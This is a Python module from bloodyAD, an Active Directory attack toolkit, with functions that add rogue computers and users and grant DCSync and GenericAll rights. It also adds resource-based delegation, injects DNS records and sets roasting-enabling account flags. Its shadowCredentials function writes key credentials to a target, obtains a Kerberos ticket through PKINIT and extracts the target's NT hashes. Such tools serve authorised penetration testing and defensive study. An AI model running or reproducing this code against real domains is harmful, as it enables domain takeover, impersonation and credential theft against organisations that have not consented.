import binascii, datetime, random, string, base64
from typing import Literal
from urllib import parse
from bloodyAD import utils
from bloodyAD.exceptions import LOG
from bloodyAD.formatters import accesscontrol, common, cryptography, dns
from bloodyAD.network.ldap import Change, Scope
from bloodyAD.exceptions import BloodyError
import msldap
from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from minikerberos.common import factory
from minikerberos.protocol.external import ticketutil


def computer(conn, hostname: str, newpass: str, ou: str = "DefaultOU", lifetime: int = 0):
    """
    Add new computer

    :param hostname: computer name (without trailing $)
    :param newpass: password for computer
    :param ou: Organizational Unit for computer
    :param lifetime: lifetime of new computer in seconds, if non-zero creates it as a dynamic object
    """

    if ou == "DefaultOU":
        container = None
        for obj in next(
            conn.ldap.bloodysearch(conn.ldap.domainNC, attr=["wellKnownObjects"])
        )["wellKnownObjects"]:
            if "GUID_COMPUTERS_CONTAINER_W" == obj.binary_value:
                container = obj.dn
                break
        if not container:
            LOG.warning(
                "Default container for computers not found, defaulting to CN=Computers,"
                + conn.ldap.domainNC
            )
            container = "cn=Computers" + conn.ldap.domainNC
        computer_dn = f"cn={hostname},{container}"
    else:
        computer_dn = f"cn={hostname},{ou}"

    # Default computer SPNs
    spns = [
        "HOST/%s" % hostname,
        "HOST/%s.%s" % (hostname, conn.conf.domain),
        "RestrictedKrbHost/%s" % hostname,
        "RestrictedKrbHost/%s.%s" % (hostname, conn.conf.domain),
    ]
    attr = {
        "objectClass": [
            "top",
            "person",
            "organizationalPerson",
            "user",
            "computer",
        ],
        "dnsHostName": "%s.%s" % (hostname, conn.conf.domain),
        "userAccountControl": 0x1000,
        "servicePrincipalName": spns,
        "sAMAccountName": f"{hostname}$",
        "unicodePwd": '"%s"' % newpass,
    }

    if lifetime > 0:
        attr["objectClass"].append("dynamicObject")
        attr["entryTTL"] = lifetime

    conn.ldap.bloodyadd(computer_dn, attributes=attr)
    LOG.info(f"[+] {hostname} created")


def dcsync(conn, trustee: str):
    """
    Add DCSync right on domain to provided trustee (Requires to own or to have WriteDacl on domain object)

    :param trustee: sAMAccountName, DN, GUID or SID of the trustee
    """
    new_sd, _ = utils.getSD(conn, conn.ldap.domainNC)
    if "s-1-" in trustee.lower():
        trustee_sid = trustee
    else:
        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr=["objectSid"]))[
            "objectSid"
        ]
    access_mask = accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
    utils.addRight(new_sd, trustee_sid, access_mask)

    req_flags = msldap.wintypes.asn1.sdflagsrequest.SDFlagsRequestValue(
        {"Flags": accesscontrol.DACL_SECURITY_INFORMATION}
    )
    controls = [("1.2.840.113556.1.4.801", True, req_flags.dump())]

    conn.ldap.bloodymodify(
        conn.ldap.domainNC,
        {"nTSecurityDescriptor": [(Change.REPLACE.value, new_sd.getData())]},
        controls,
    )

    LOG.info(f"[+] {trustee} is now able to DCSync")


# Credits to Kevin Robertson and his script Invoke-DNSUpdate.ps1 from the Powermad framework
def dnsRecord(
    conn,
    name: str,
    data: str,
    dnstype: Literal["A", "AAAA", "CNAME", "MX", "PTR", "SRV", "TXT"] = "A",
    zone: str = "CurrentDomain",
    ttl: int = 300,
    preference: int = 10,
    port: int = None,
    priority: int = 10,
    weight: int = 60,
    forest: bool = False,
):
    """
    This function adds a new DNS record into an AD environment.

    :param name: name of the dnsNode object (hostname) which will contain the new record
    :param data: DNS record data, for most record types this will be the destination hostname or IP address, for TXT records this can be used for text
    :param dnstype: DNS record type
    :param zone: DNS zone
    :param ttl: DNS record TTL, time in seconds the record stays in DNS caches, must be low if you want to propagate record updates quickly
    :param preference: DNS MX record preference, must be lower than the concurrent records to be chosen
    :param port: listening port of the service in a DNS SRV record
    :param priority: priority of a DNS SRV record against concurrent, must be lower to be chosen, if identical to others, highest weight will be chosen
    :param weight: weight of a DNS SRV record against concurrent, must be higher with the lowest priority to be chosen
    :param forest: if set, registers dns record in forest instead of domain
    """
    # DNS_RPC_RECORD - section 2.2.2.2.5
    # RANK_ZONE - The record comes from an authoritative zone
    rank = 0xF0

    naming_context = "," + conn.ldap.domainNC
    if zone == "CurrentDomain":
        zone = ""
        for label in naming_context.split(",DC="):
            if label:
                zone += "." + label
        if forest:
            zone = "_msdcs" + zone
        else:
            # Removes first dot
            zone = zone[1:]

    # TODO: take into account custom ForestDnsZones and DomainDnsZones partition name ?
    if forest:
        zone_type = "ForestDnsZones"
    else:
        zone_type = "DomainDnsZones"

    zone_dn = f"DC={zone},CN=MicrosoftDNS,DC={zone_type}{naming_context}"
    record_dn = None

    serial = None
    new_dnsrecord_list = None
    ldap_filter = f"(|(name=@)(name={name}))"
    for entry in conn.ldap.bloodysearch(
        zone_dn,
        ldap_filter=ldap_filter,
        search_scope=Scope.SUBTREE,
        attr=["name", "dnsRecord"],
        raw=True,
    ):
        if entry["name"][0] == b"@":
            for raw_record in entry["dnsRecord"]:
                dns_record = dns.Record(raw_record).toDict()
                if dns_record.get("Type") == "SOA":
                    serial = dns_record["Data"]["SerialNo"]
                    break
        else:
            record_dn = entry["distinguishedName"]
            new_dnsrecord_list = entry["dnsRecord"]

    if not serial:
        raise BloodyError(f"No '@' entry found in '{zone_dn}' with '{ldap_filter}'")
    new_dnsrecord = dns.Record()
    new_dnsrecord.fromDict(
        data, dnstype, ttl, rank, serial, preference, port, priority, weight
    )

    if not record_dn:
        record_dn = f"DC={name},{zone_dn}"
        record_attr = {
            "objectClass": ["top", "dnsNode"],
            "dnsRecord": new_dnsrecord.getData(),
            "dNSTombstoned": False,
        }
        conn.ldap.bloodyadd(record_dn, attributes=record_attr)
        LOG.info(f"[+] {name} has been successfully added")
        return

    new_dnsrecord_list.append(new_dnsrecord.getData())
    print(new_dnsrecord_list)
    conn.ldap.bloodymodify(
        record_dn, {"dnsRecord": [(Change.REPLACE.value, new_dnsrecord_list)]}
    )
    LOG.info(f"[+] {name} has been successfully updated")


def genericAll(conn, target: str, trustee: str):
    """
    Give full control to trustee on target and descendants (you must own the object or have WriteDacl)

    :param target: sAMAccountName, DN, GUID or SID of the target
    :param trustee: sAMAccountName, DN, GUID or SID of the trustee which will have full control on target
    """
    new_sd, _ = utils.getSD(conn, target)
    if "s-1-" in trustee.lower():
        trustee_sid = trustee
    else:
        trustee_sid = next(conn.ldap.bloodysearch(trustee, attr=["objectSid"]))[
            "objectSid"
        ]
    utils.addRight(new_sd, trustee_sid)

    req_flags = msldap.wintypes.asn1.sdflagsrequest.SDFlagsRequestValue(
        {"Flags": accesscontrol.DACL_SECURITY_INFORMATION}
    )
    controls = [("1.2.840.113556.1.4.801", True, req_flags.dump())]

    conn.ldap.bloodymodify(
        target,
        {"nTSecurityDescriptor": [(Change.REPLACE.value, new_sd.getData())]},
        controls,
    )

    LOG.info(f"[+] {trustee} has now GenericAll on {target}")


def groupMember(conn, group: str, member: str):
    """
    Add a new member (user, group, computer) to group

    :param group: sAMAccountName, DN, GUID or SID of the group
    :param member: sAMAccountName, DN, GUID or SID of the member
    """
    # This is equivalent to classic add member,
    # see [MS-ADTS] - 3.1.1.3.1.2.4 Alternative Forms of DNs
    # But <SID='sid'> also has the advantage of being compatible with foreign security principals,
    # see [MS-ADTS] - 3.1.1.5.3.3 Processing Specifics
    if "s-1-" in member.lower():
        # We assume member is an SID
        member_transformed = f"<SID={member}>"
    else:
        member_transformed = conn.ldap.dnResolver(member)

    conn.ldap.bloodymodify(group, {"member": [(Change.ADD.value, member_transformed)]})
    LOG.info(f"[+] {member} added to {group}")


def rbcd(conn, target: str, service: str):
    """
    Add Resource Based Constraint Delegation for service on target, used to impersonate a user on target with service (Requires "Write" permission on target's msDS-AllowedToActOnBehalfOfOtherIdentity and Windows Server >= 2012)

    :param target: sAMAccountName, DN, GUID or SID of the target
    :param service: sAMAccountName, DN, GUID or SID of the service account
    """
    control_flag = 0
    new_sd, _ = utils.getSD(
        conn, target, "msDS-AllowedToActOnBehalfOfOtherIdentity", control_flag
    )
    if "s-1-" in service.lower():
        service_sid = service
    else:
        service_sid = next(conn.ldap.bloodysearch(service, attr=["objectSid"]))[
            "objectSid"
        ]
    access_mask = accesscontrol.ACCESS_FLAGS["ADS_RIGHT_DS_CONTROL_ACCESS"]
    utils.addRight(new_sd, service_sid, access_mask)

    conn.ldap.bloodymodify(
        target,
        {
            "msDS-AllowedToActOnBehalfOfOtherIdentity": [
                (
                    Change.REPLACE.value,
                    new_sd.getData(),
                )
            ]
        },
    )

    LOG.info(f"[+] {service} can now impersonate users on {target} via S4U2Proxy")


def shadowCredentials(conn, target: str, path: str = "CurrentPath"):
    """
    Add Key Credentials to target, and use those credentials to retrieve a TGT and a NT hash using PKINIT.

    :param target: sAMAccountName, DN, GUID or SID of the target
    :param path: filepath for the generated credentials (TGT ccache or pfx if PKINIT fails)
    """

    target_dn = None
    target_sAMAccountName = None
    for entry in conn.ldap.bloodysearch(target, attr=["distinguishedName", "sAMAccountName"]):
        target_dn = entry["distinguishedName"]
        target_sAMAccountName = entry["sAMAccountName"]
    if path == "CurrentPath":
        path = target_sAMAccountName + "_" + "".join(
            random.choice(string.ascii_letters + string.digits) for i in range(2)
        )

    LOG.debug("[*] Generating certificate")

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = x509.Name.from_rfc4514_string(target_dn)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(subject)
        .serial_number(x509.random_serial_number())
        .public_key(key.public_key())
        .not_valid_before(datetime.datetime.utcnow())
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
        .sign(key, hashes.SHA256())
    )

    LOG.debug("[*] Generating KeyCredential")

    keyCredential = cryptography.KEYCREDENTIALLINK_BLOB()
    keyCredential.keyCredentialLink_from_x509(cert)

    LOG.info(
        "[+] KeyCredential generated with following sha256 of RSA key: %s"
        % binascii.hexlify(keyCredential.getKeyID()).decode()
    )

    LOG.debug("[*] Updating the msDS-KeyCredentialLink attribute of %s" % target)

    key_dnbinary = common.DNBinary()
    key_dnbinary.fromCanonical(keyCredential.getData(), target_dn)
    conn.ldap.bloodymodify(
        target_dn,
        {"msDS-KeyCredentialLink": [(Change.ADD.value, str(key_dnbinary))]},
    )

    LOG.debug("[+] msDS-KeyCredentialLink attribute of the target object updated")

    pfx = serialization.pkcs12.serialize_key_and_certificates(
        name=target_dn.encode(),
        key=key,
        cert=cert,
        cas=None,
        encryption_algorithm=serialization.NoEncryption(),
    )
    pfx_base64 = parse.quote(base64.b64encode(pfx).decode('utf-8'), safe="")

    client = None
    try:
        url = f"kerberos+pfxstr://{conn.conf.domain}\\{target_sAMAccountName}@{conn.conf.dcip}/?certdata={pfx_base64}"
        cu = factory.KerberosClientFactory.from_url(url)
        client = cu.get_client_blocking()
        tgs, enctgs, key, decticket = client.U2U()
    except Exception as e:
        pfx_path = path + ".pfx"
        with open(pfx_path, "wb") as f:
            f.write(pfx)
        LOG.error(f"[-] PKINIT failed on DC {conn.conf.dcip}, you must find a Kerberos server with a certification authority!")
        LOG.info(f"[+] PKINIT PFX certificate saved at: %s" % pfx_path)
        raise e
    finally:
        if client and client.kerberos_TGT:
            ccache_path = path + ".ccache"
            client.ccache.to_file(path + ".ccache")
            LOG.info('[+] TGT stored in ccache file %s' % ccache_path)
    
    return [{cred[0]:cred[1]} for cred in ticketutil.get_NT_from_PAC(client.pkinit_tkey, decticket)]

            


def uac(conn, target: str, f: list = None):
    """
    Add property flags altering user/computer object behavior

    :param target: sAMAccountName, DN, GUID or SID of the target
    :param f: name of property flag to add, can be called multiple times if multiple flags to add (e.g -f DONT_REQ_PREAUTH  -f DONT_EXPIRE_PASSWORD)
    """
    # TODO: Give scenarios with interesting account control flags

    # List of flags: https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties

    # Some flags are computed (so can't be set directly? seems it depends because LOCKOUT can be removed but not added): LOCKOUT, PASSWORD_EXPIRED, PARTIAL_SECRETS_ACCOUNT, USE_AES_KEYS
    # https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-user-account-control-computed

    # The following flags are mutually exclusives and can't be changed by NetUserSetInfo (so maybe not modifiable at all?):
    # NORMAL_ACCOUNT, TEMP_DUPLICATE_ACCOUNT, WORKSTATION_TRUST_ACCOUNT, SERVER_TRUST_ACCOUNT, INTERDOMAIN_TRUST_ACCOUNT
    # https://learn.microsoft.com/en-us/windows/win32/api/lmaccess/ns-lmaccess-user_info_1008#members

    # Privileges needed for TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,TRUSTED_FOR_DELEGATION,PASSWD_NOTREQD,DONT_EXPIRE_PASSWD,ENCRYPTED_TEXT_PASSWORD_ALLOWED,SERVER_TRUST_ACCOUNT:
    # https://learn.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netusersetinfo#remarks

    uac = 0
    for flag in f:
        uac |= accesscontrol.ACCOUNT_FLAGS[flag]

    try:
        old_uac = next(
            conn.ldap.bloodysearch(target, attr=["userAccountControl"], raw=True)
        )["userAccountControl"][0]
    except IndexError as e:
        for allowed in next(conn.ldap.bloodysearch(target, attr=["allowedAttributes"]))[
            "allowedAttributes"
        ]:
            if "userAccountControl" in allowed:
                raise BloodyError(
                    "Current user doesn't have the right to read userAccountControl on"
                    f" {target}"
                ) from e
        raise BloodyError(f"{target} doesn't have userAccountControl attribute") from e
    uac |= int(old_uac)
    conn.ldap.bloodymodify(
        target, {"userAccountControl": [(Change.REPLACE.value, uac)]}
    )

    LOG.info(f"[-] {f} property flags added to {target}'s userAccountControl")


def user(conn, sAMAccountName: str, newpass: str, ou: str = "DefaultOU", lifetime: int = 0):
    """
    Add a new user

    :param sAMAccountName: sAMAccountName for new user
    :param newpass: password for new user
    :param ou: Organizational Unit for new user
    :param lifetime: lifetime of new user in seconds, if non-zero creates it as a dynamic object
    """
    if ou == "DefaultOU":
        container = None
        for obj in next(
            conn.ldap.bloodysearch(conn.ldap.domainNC, attr=["wellKnownObjects"])
        )["wellKnownObjects"]:
            if "GUID_USERS_CONTAINER_W" == obj.binary_value:
                container = obj.dn
                break
        if not container:
            LOG.warning(
                "Default container for users not found, defaulting to CN=Users,"
                + conn.ldap.domainNC
            )
            container = "cn=Users" + conn.ldap.domainNC
        user_dn = f"cn={sAMAccountName},{container}"
    else:
        user_dn = f"cn={sAMAccountName},{ou}"

    attr = {
        "objectClass": ["top", "person", "organizationalPerson", "user"],
        "distinguishedName": user_dn,
        "sAMAccountName": sAMAccountName,
        "userAccountControl": 544,
        "unicodePwd": '"%s"' % newpass,
    }

    if lifetime > 0:
        attr["objectClass"].append("dynamicObject")
        attr["entryTTL"] = lifetime

    conn.ldap.bloodyadd(user_dn, attributes=attr)
    LOG.info(f"[+] {sAMAccountName} created")
